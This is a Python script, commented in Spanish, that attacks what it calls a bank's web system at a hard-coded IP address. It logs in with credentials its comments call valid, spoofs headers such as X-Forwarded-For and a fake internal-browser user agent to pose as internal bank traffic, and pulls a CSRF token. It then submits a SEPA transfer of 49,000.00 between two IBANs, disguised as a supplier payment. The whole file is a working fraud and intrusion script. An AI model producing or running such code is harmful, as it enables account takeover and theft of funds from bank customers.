import requests

# --- DATOS ---
login_url = "http://80.78.30.242:9181"
transfer_url = "http://80.78.30.242:9181/api/transferencia"

# Credenciales válidas, sin duda
username = "493068k1"
password = "bar1588623"

# IP interna fingida
ip_interna = "192.168.x.x"  # Pon la IP real que tienes, aunque sea inventada

# --- CABECERAS simulando desde un browser interno del banco ---
headers = {
    "Host": "80.78.30.242:9181",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0; es-ES) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",  # Formularios web usan esto, no JSON
    "X-Origin-IP": ip_interna,
    "X-Forwarded-For": ip_interna,
    "X-Geo-Location": "40.4074,3.6915",  # Madrid, por ejemplo
    "Referer": "http://80.78.30.242:9181",  # Fingir que vengo de una página interna
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://80.78.30.242:9181"
}

# --- Sesión con cookies ---
session = requests.Session()
session.headers.update(headers)

# --- Paso 1: Obtener CSRF token desde la página de login ---
login_page_url = "http://80.78.30.242:9181/api/transferencia"  # Si es web tradicional, esto puede dar más info
try:
    login_page_response = session.get(login_page_url)
    csrftoken_cookie = session.cookies.get("csrftoken")
    print("Token CSRF desde cookie obtenido:", csrftoken_cookie)
except Exception as e:
    print("[!] Error obteniendo página de login:", e)
    csrftoken_cookie = "dummycsrf"

# --- Paso 2: Logueo con payload simulado ---
if csrftoken_cookie:
    payload = {
        'username': username,
        'password': password,
        'csrfmiddlewaretoken': csrftoken_cookie
    }
    response = session.post(login_url, data=payload, headers=headers)

    print("\n[+] Status Code Login:", response.status_code)
    print("Cookies después del login:", session.cookies.get_dict())
    print("Respuesta del servidor (principio):", response.text[:500])

    # --- Paso 3: Si login OK, hacer transferencia SEPA ---
    if "sessionid" in session.cookies.get_dict():
        print("\n[*] ¡Tenemos sesión activa! Comenzando transferencia SEPA...")
        transfer_data = {
            "iban_source": "ES12345678901234567890",
            "iban_destination": "ES98765432109876543210",
            "amount": "49000.00",
            "reason": "PAGO-PROVEEDOR",
            "csrfmiddlewaretoken": csrftoken_cookie,
        }

        transfer_response = session.post(transfer_url, data=transfer_data, headers=headers)
        print("\n[+] Respuesta de transferencia SEPA:")
        print("Status:", transfer_response.status_code)
        print(transfer_response.text[:1000])
    else:
        print("\n[-] No se logró obtener sesión válida.")

else:
    print("[!] No se obtuvo token CSRF. Necesito más info del sistema.")